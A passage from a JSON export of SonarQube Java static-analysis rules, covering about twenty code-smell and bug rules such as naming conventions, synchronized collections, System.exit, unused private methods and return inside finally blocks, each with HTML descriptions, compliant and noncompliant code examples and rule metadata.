MyClass {\n  public static final float PI = 3.14159f;\n\n  void myMethod() {\n    System.out.println(PI);\n  }\n}\n\npublic enum MyEnum {\n  OPTION_ONE,\n  OPTION_TWO;\n}\n</pre>\n<h3>Exceptions</h3>\n<p>The rule applies to fields of primitive types (for example, <code>float</code>), boxed primitives (<code>Float</code>), and Strings. We do not\napply it to other types, which can be mutated, or have methods with side effects.</p>\n<pre>\npublic static final Logger log = getLogger(MyClass.class);\npublic static final List&lt;Integer&gt; myList = new ArrayList&lt;&gt;();\n\n// call with side-effects\nlog.info(\"message\")\n\n// mutating an object\nmyList.add(28);\n</pre>\n<h2>Resources</h2>\n<h3>External coding guidelines</h3>\n<ul>\n  <li> <a href=\"https://google.github.io/styleguide/javaguide.html#s5.2.4-constant-names\">The Google Java Style Guide on Constant Names</a>. </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-115","summary":"Constant names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Early classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them\nthread-safe. However, synchronization has a significant negative impact on performance, even when using these collections from a single thread.</p>\n<p>It is often best to use their non-synchronized counterparts:</p>\n<ul>\n  <li> <code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code> </li>\n  <li> <code>Deque</code> instead of <code>Stack</code> </li>\n  <li> <code>HashMap</code> instead of <code>Hashtable</code> </li>\n  <li> <code>StringBuilder</code> instead of <code>StringBuffer</code> </li>\n</ul>\n<p>Even when used in synchronized contexts, you should think twice before using their synchronized counterparts, since their usage can be costly. If\nyou are confident the usage is legitimate, you can safely ignore this warning.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nVector&lt;Cat&gt; cats = new Vector&lt;&gt;();\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nArrayList&lt;Cat&gt; cats = new ArrayList&lt;&gt;();\n</pre>\n<h3>Exceptions</h3>\n<p>Usage of these synchronized classes is ignored in the signatures of overriding methods.</p>\n<pre>\n@Override\npublic Vector getCats() {...} // Compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1149","summary":"Synchronized classes \"Vector\", \"Hashtable\", \"Stack\" and \"StringBuffer\" should not be used","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the\nentire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and\nskipping finalization.</p>\n<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them\nshould be called from applications running in a J2EE container.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nSystem.exit(0);\nRuntime.getRuntime().exit(0);\nRuntime.getRuntime().halt(0);\n</pre>\n<h3>Exceptions</h3>\n<p>These methods are ignored inside <code>main</code>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/382\">CWE-382 - Use of System.exit()</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7zZGBQ\">CERT, ERR09-J.</a> - Do not allow untrusted code to terminate the JVM </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1147","summary":"Exit methods should not be called","tags":["cwe","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when a private method is never referenced in the code.</p>\n<h2>Why is this an issue?</h2>\n<p>A method that is never called is dead code, and should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it\neasier to understand the program and preventing bugs from being introduced.</p>\n<p>This rule detects methods that are never referenced from inside a translation unit, and cannot be referenced from the outside.</p>\n<h3>Code examples</h3>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Foo implements Serializable\n{\n  public static void doSomething() {\n    Foo foo = new Foo();\n    ...\n  }\n\n  private void unusedPrivateMethod() {...}\n  private void writeObject(ObjectOutputStream s) {...}  //Compliant, relates to the java serialization mechanism\n  private void readObject(ObjectInputStream in) {...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Foo implements Serializable\n{\n  public static void doSomething(){\n    Foo foo = new Foo();\n    ...\n  }\n\n  private void writeObject(ObjectOutputStream s) {...}  //Compliant, relates to the java serialization mechanism\n  private void readObject(ObjectInputStream in) {...}  //Compliant, relates to the java serialization mechanism\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule doesnât raise issues for:</p>\n<ul>\n  <li> annotated methods </li>\n  <li> methods with parameters that are annotated with <code>@javax.enterprise.event.Observes</code> </li>\n</ul>\n<p>The rule does not take reflection into account, which means that issues will be raised on <code>private</code> methods that are only accessed using\nthe reflection API.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1144","summary":"Unused \"private\" methods should be removed","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any\nunhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>\n<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and\n<code>goto</code>) would force control flow to leave a <code>finally</code> block.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println(\"OK\");   // incorrect \"OK\" message is printed\n  } catch (RuntimeException e) {\n    System.out.println(\"ERROR\");  // this message is not shown\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n    return;      // Noncompliant - prevents the RuntimeException from being propagated\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println(\"OK\");\n  } catch (RuntimeException e) {\n    System.out.println(\"ERROR\");  // \"ERROR\" is printed as expected\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/584\">CWE-584 - Return Inside Finally Block</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/BTdGBQ\">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1143","summary":"Jump statements should not occur in \"finally\" blocks","tags":["cwe","error-handling","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Having too many return statements in a method increases the methodâs essential complexity because the flow of execution is broken each time a\nreturn statement is encountered. This makes it harder to read and understand the logic of the method.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default threshold of 3:</p>\n<pre>\npublic boolean myMethod() { // Noncompliant; there are 4 return statements\n  if (condition1) {\n    return true;\n  } else {\n    if (condition2) {\n      return false;\n    } else {\n      return true;\n    }\n  }\n  return false;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1142","summary":"Methods should not have too many return statements","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand\nwhich block will catch which exception.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1141","summary":"Try-catch blocks should not be nested","tags":["error-handling","confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all\ninterface names match a provided regular expression.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>\n<pre>\npublic interface myInterface {...} // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic interface MyInterface {...}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-114","summary":"Interface names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>Developers often use <code>TODO</code> tags to mark areas in the code where additional work or improvements are needed but are not implemented\nimmediately. However, these <code>TODO</code> tags sometimes get overlooked or forgotten, leading to incomplete or unfinished code. This rule aims to\nidentify and address unattended <code>TODO</code> tags to ensure a clean and maintainable codebase. This description explores why this is a problem\nand how it can be fixed to improve the overall code quality.</p>\n<h3>What is the potential impact?</h3>\n<p>Unattended <code>TODO</code> tags in code can have significant implications for the development process and the overall codebase.</p>\n<p>Incomplete Functionality: When developers leave <code>TODO</code> tags without implementing the corresponding code, it results in incomplete\nfunctionality within the software. This can lead to unexpected behavior or missing features, adversely affecting the end-user experience.</p>\n<p>Missed Bug Fixes: If developers do not promptly address <code>TODO</code> tags, they might overlook critical bug fixes and security updates.\nDelayed bug fixes can result in more severe issues and increase the effort required to resolve them later.</p>\n<p>Impact on Collaboration: In team-based development environments, unattended <code>TODO</code> tags can hinder collaboration. Other team members\nmight not be aware of the intended changes, leading to conflicts or redundant efforts in the codebase.</p>\n<p>Codebase Bloat: The accumulation of unattended <code>TODO</code> tags over time can clutter the codebase and make it difficult to distinguish\nbetween work in progress and completed code. This bloat can make it challenging to maintain an organized and efficient codebase.</p>\n<p>Addressing this code smell is essential to ensure a maintainable, readable, reliable codebase and promote effective collaboration among\ndevelopers.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvoid doSomething() {\n  // TODO\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/546\">CWE-546 - Suspicious Comment</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1135","summary":"Track uses of \"TODO\" tags","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>\n<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>\n<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>\n<pre>\nint divide(int numerator, int denominator) {\n  return numerator / denominator;              // FIXME denominator value might be  0\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/546\">CWE-546 - Suspicious Comment</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1134","summary":"Track uses of \"FIXME\" tags","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>This rule is meant to be used as a way to track code which is marked as being deprecated. Deprecated code should eventually be removed.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass Foo {\n  /**\n   * @deprecated\n   */\n  public void foo() {    // Noncompliant\n  }\n\n  @Deprecated            // Noncompliant\n  public void bar() {\n  }\n\n  public void baz() {    // Compliant\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1133","summary":"Deprecated code should be removed","tags":["obsolete"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>It is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.</p>\n<p>This prevents null pointer exceptions from being raised, as a string literal can never be null by definition.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString myString = null;\n\nSystem.out.println(\"Equal? \" + myString.equals(\"foo\"));                        // Noncompliant; will raise a NPE\nSystem.out.println(\"Equal? \" + (myString != null &amp;&amp; myString.equals(\"foo\")));  // Noncompliant; null check could be removed\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nSystem.out.println(\"Equal?\" + \"foo\".equals(myString));                         // properly deals with the null case\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"covered","ruleKey":"RSPEC-1132","summary":"Strings literals should be placed on the left side when checking for equality","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Superfluous exceptions within <code>throws</code> clauses have negative effects on the readability and maintainability of the code. An exception in\na <code>throws</code> clause is superfluous if it is:</p>\n<ul>\n  <li> listed multiple times </li>\n  <li> a subclass of another listed exception </li>\n  <li> not actually thrown by any execution path of the method </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid foo() throws MyException, MyException {}  // Noncompliant; should be listed once\nvoid bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable\nvoid boo() throws IOException { // Noncompliant; IOException cannot be thrown\n  System.out.println(\"Hi!\");\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid foo() throws MyException {}\nvoid bar() throws Throwable {}\nvoid boo() {\n  System.out.println(\"Hi!\");\n}\n</pre>\n<h3>Exceptions</h3>\n<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>\n<ul>\n  <li> in interface <code>default</code> methods </li>\n  <li> in overriding and implementating methods </li>\n  <li> in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement. </li>\n  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper\n  JavaDoc </li>\n</ul>\n<pre>\ninterface MyInterface {\n  default void defaultMethod() throws IOException {\n    System.out.println(\"Hi!\");\n  }\n  void doSomething() throws IOException;\n}\n\nclass A implements MyInterface {\n  @Override\n  void doSomething() throws IOException {\n    System.out.println(\"Hi!\");\n  }\n\n  public void emptyBody() throws IOException {}\n\n  protected void singleThrowStatement() throws IOException {\n    throw new UnsupportedOperationException(\"This method should be implemented in subclasses\");\n  }\n\n  Object singleReturnStatement() throws IOException {\n    return null;\n  }\n\n  /**\n   * @throws IOException Overriding classes may throw this exception if they print values into a file\n   */\n  protected void overridable() throws IOException { // no issue, method is overridable and the exception has proper javadoc\n    System.out.println(\"foo\");\n  }\n}\n</pre>\n<p>Also, the rule will not raise issues on <code>RuntimeException</code>, or one of its sub-classes, because documenting runtime exceptions which\ncould be thrown can ultimately help users of the method understand its behavior.</p>\n<pre>\nclass B {\n  int possibleDivisionByZero(int a, int b) throws ArithmeticException {\n      return a / b;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1130","summary":"Exceptions in \"throws\" clauses should not be superfluous","tags":["error-handling","unused","redundant","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Some tools work better when files end with a newline.</p>\n<p>This rule simply generates an issue if it is missing.</p>\n<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>\n<pre>\n+class Test {\n+}\n\\ No newline at end of file\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-113","summary":"Files should end with a newline","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Unnecessary imports refer to importing types that are not used or referenced anywhere in the code.</p>\n<p>Although they donât affect the runtime behavior of the application after compilation, removing them will:</p>\n<ul>\n  <li> Improve the readability and maintainability of the code. </li>\n  <li> Help avoid potential naming conflicts. </li>\n  <li> Improve the build time, as the compiler has fewer lines to read and fewer types to resolve. </li>\n  <li> Reduce the number of items the code editor will show for auto-completion, thereby showing fewer irrelevant suggestions. </li>\n</ul>\n<h3>Exceptions</h3>\n<p>Imports for types mentioned in Javadocs are ignored.</p>\n<h2>How to fix it</h2>\n<p>While itâs not difficult to remove these unneeded lines manually, modern code editors support the removal of every unnecessary import with a single\nclick from every file of the project.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npackage myapp.helpers;\n\nimport java.io.IOException;\nimport java.nio.file.*;\nimport java.nio.file.*;     // Noncompliant - package is imported twice\nimport java.lang.Runnable;  // Noncompliant - java.lang is imported by default\n\npublic class FileHelper {\n    public static String readFirstLine(String filePath) throws IOException {\n        return Files.readAllLines(Paths.get(filePath)).get(0);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npackage myapp.helpers;\n\nimport java.io.IOException;\nimport java.nio.file.*;\n\npublic class FileHelper {\n    public static String readFirstLine(String filePath) throws IOException {\n        return Files.readAllLines(Paths.get(filePath)).get(0);\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/package/usepkgs.html\">Java packages</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S1144} - Unused \"private\" methods should be removed </li>\n  <li> {rule:java:S1481} - Unused local variables should be removed </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1128","summary":"Unnecessary imports should be removed","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>\n<p>Similarly, method invocations wrapped into <code>if-then-else</code> differing only from boolean literals should be simplified into a single\ninvocation.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nboolean foo(Object param) {\n  if (expression) { // Noncompliant\n    bar(param, true, \"qix\");\n  } else {\n    bar(param, false, \"qix\");\n  }\n\n  if (expression) {  // Noncompliant\n    return true;\n  } else {\n    return false;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nboolean foo(Object param) {\n  bar(param, expression, \"qix\");\n\n  return expression;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1126","summary":"Return of boolean expressions should not be wrapped into an \"if-then-else\" statement","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>A boolean literal can be represented in two different ways: <code>true</code> or <code>false</code>. They can be combined with logical operators\n(<code>!, &amp;&amp;, ||, ==, !=</code>) to produce logical expressions that represent truth values. However, comparing a boolean literal to a\nvariable or expression that evaluates to a boolean value is unnecessary and can make the code harder to read and understand. The more complex a\nboolean expression is, the harder it will be for developers to understand its meaning and expected behavior, and it will favour the introduction of\nnew bugs.</p>\n<h2>How to fix it</h2>\n<p>Remove redundant boolean literals from expressions to improve readability and make the code more maintainable.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (booleanMethod() == true) { /* ... */ }\nif (booleanMethod() == false) { /* ... */ }\nif (booleanMethod() || false) { /* ... */ }\ndoSomething(!false);\ndoSomething(booleanMethod() == true);\n\nbooleanVariable = booleanMethod() ? true : false;\nbooleanVariable = booleanMethod() ? true : exp;\nbooleanVariable = booleanMethod() ? false : exp;\nbooleanVariable = booleanMethod() ? exp : true;\nbooleanVariable = booleanMethod() ? exp : false;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif (booleanMethod()) { /* ... */ }\nif (!booleanMethod()) { /* ... */ }\nif (booleanMethod()) { /* ... */ }\ndoSomething(true);\ndoSomething(booleanMethod());\n\nbooleanVariable = booleanMethod();\nbooleanVariable = booleanMethod() || exp;\nbooleanVariable = !booleanMethod() &amp;&amp; exp;\nbooleanVariable = !booleanMethod() || exp;\nbooleanVariable = booleanMethod() &amp;&amp; exp;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-1125","summary":"Boolean literals should not be redundant","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The Java Language Specification recommends listing modifiers in the following order:</p>\n<ol>\n  <li> Annotations </li>\n  <li> public </li>\n  <li> protected </li>\n  <li> private </li>\n  <li> abstract </li>\n  <li> static </li>\n  <li> final </li>\n  <li> transient </li>\n  <li> volatile </li>\n  <li> synchronized </li>\n  <li> native </li>\n  <li> default </li>\n  <li> strictfp </li>\n</ol>\n<p>Not following this convention has no technical impact, but will reduce the codeâs readability because most developers are used to the standard\norder.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nstatic public void main(String[] args) {   // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic static void main(String[] args) {   // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1124","summary":"Modifiers should be declared in the correct order","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as\nIDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be\nrefactored.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass MyClass {\n\n  @Deprecated\n  public void foo1() {    // Noncompliant: Add the missing @deprecated Javadoc tag.\n  }\n\n  /**\n    * @deprecated\n    */\n  public void foo2() {    // Noncompliant: Add the missing @Deprecated annotation.\n  }\n\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass MyClass {\n\n  /**\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated\n  public void foo1() {\n  }\n\n}\n</pre>\n<h3>Exceptions</h3>\n<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to\nit.</p>\n<pre>\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\nclass Qix  {\n\n  public void foo() {} // Compliant; class is deprecated\n\n}\n\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\ninterface Plop {\n\n  void bar();\n\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1123","summary":"Deprecated elements should have both the annotation and the Javadoc tag","tags":["obsolete","bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A common code smell that can hinder the clarity of source code is making assignments within sub-expressions. This practice involves assigning a\nvalue to a variable inside a larger expression, such as within a loop or a conditional statement.</p>\n<p>This practice essentially gives a side-effect to a larger expression, thus making it less readable. This often leads to confusion and potential\nerrors.</p>\n<h3>Exceptions</h3>\n<p>This rule ignores assignments in conditions of <code>while</code> statements and assignments enclosed in relational expressions.</p>\n<pre>\nvoid processInput(BufferedReader br) {\n  String line;\n  while ((line = br.readLine()) != null) {\n    processLine(line);\n  }\n}\n\nObject foo;\nif ((foo = bar()) != null) {\n  // do something with \"foo\"\n}\n</pre>\n<p>This rule also ignores chained assignments, including compound assignments.</p>\n<pre>\nint j, i = j = 0;\nint k = (j += 1);\nbyte[] result, bresult;\nresult = (bresult = new byte[len]);\n</pre>\n<h2>How to fix it</h2>\n<p>Making assignments within sub-expressions can hinder the clarity of source code.</p>\n<p>This practice essentially gives a side-effect to a larger expression, thus making it less readable. This often leads to confusion and potential\nerrors.</p>\n<p>Extracting assignments into separate statements is encouraged to keep the code clear and straightforward.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString str;\nif (!(str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant\n  // do something with \"str\"\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString str = cont.substring(pos1, pos2);\nif (!str.isEmpty()) {\n  // do something with \"str\"\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/481\">CWE-481 - Assigning instead of Comparing</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITZGBQ\">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1121","summary":"Assignments should not be made from within 